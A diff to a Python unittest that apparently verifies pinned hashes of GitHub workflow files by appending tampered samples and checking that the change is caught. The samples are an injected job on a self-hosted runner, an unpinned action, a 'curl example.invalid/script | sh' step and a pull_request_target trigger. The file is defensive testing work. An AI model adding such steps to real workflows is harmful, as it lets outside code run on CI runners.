@@ -170,10 +170,10 @@ class HomeRunnerTrustContract(unittest.TestCase):
         for name in WORKFLOW_SHA256:
             original = (ROOT / ".github/workflows" / name).read_bytes()
             samples = (
-                original + b"\\n  Evil_job:\\n    runs-on: [self-hosted, zamerovac-qa]\\n    steps:\\n      - run: echo PWNED\\n",
-                original + b"\\n      - uses: anything@main\\n",
-                original + b"\\n      - run: curl example.invalid/script | sh\\n",
-                original + b"\\npull_request_target: {}\\n",
+                original + b"\n  Evil_job:\\n    runs-on: [self-hosted, zamerovac-qa]\\n    steps:\\n      - run: echo PWNED\\n",
+                original + b"\n      - uses: anything@main\\n",
+                original + b"\n      - run: curl example.invalid/script | sh\\n",
+                original + b"\npull_request_target: {}\\n",
             )
             for mutated in samples:
                 with self.subTest(workflow=name, mutation=mutated[-90:]):
